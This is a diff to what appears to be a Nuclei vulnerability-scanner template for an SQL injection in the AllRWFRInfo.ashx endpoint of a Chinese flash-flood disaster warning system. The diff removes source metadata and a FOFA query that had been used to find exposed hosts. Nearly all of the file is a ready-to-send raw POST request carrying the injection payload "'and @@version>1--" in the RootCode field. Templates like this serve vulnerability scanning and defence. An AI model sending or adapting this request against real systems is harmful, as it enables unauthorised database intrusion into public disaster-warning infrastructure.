@@ -3,12 +3,8 @@ info:
   name: 山洪灾害系统AllRWFRInfo存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gbqsgls7i5v8ftn9'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gbqsgls7i5v8ftn9
-    fofa: body="/AppMC/ECMTE.html
 http:
 - raw:
   - "POST /baseFrame/AllRWFRInfo.ashx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.182.3 Safari/537.36\nContent-Type: application/json\nContent-Length: 175\n\n{\n  \"REQSID\": {\n    \"Ex\": null,\n    \"UserID\": \"Admin\",\n    \"RESID\": \"65880587\",\n    \"UserGrade\": 1\n  },\n  \"ReqParas\": {\n    \"RootCode\": \"520000000000000'and @@version>1--\",\n    \"Ext\": \"\"\n  },\n  \"DataType\": \"object\",\n  \"ModelID\": \"AllRWFRInfo\"\n}"
